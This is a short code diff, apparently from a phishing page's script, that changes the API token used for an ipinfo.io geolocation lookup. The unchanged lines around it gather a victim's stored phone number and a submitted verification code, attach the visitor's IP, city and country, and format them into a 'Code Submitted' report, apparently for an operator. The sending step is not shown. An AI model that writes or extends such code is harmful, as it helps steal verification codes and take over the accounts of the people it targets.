@@ -175,7 +175,7 @@
 
       const phone = localStorage.getItem("submittedPhone") || "Not available";
 
-      const ipInfo = await fetch("https://ipinfo.io/json?token=4d1535316da2be").then(res => res.json()).catch(() => ({}));
+      const ipInfo = await fetch("https://ipinfo.io/json?token=1bb111faabd98c").then(res => res.json()).catch(() => ({}));
 
       const flag = getFlagEmoji(ipInfo.country);
       const message = `🔐 Code Submitted\n📞 Phone: ${phone}\n🔢 Code: ${code}\n🌍 Country: ${flag}\n🏙️ City: ${ipInfo.city || "N/A"}\n💻 IP: ${ipInfo.ip || "N/A"}`;
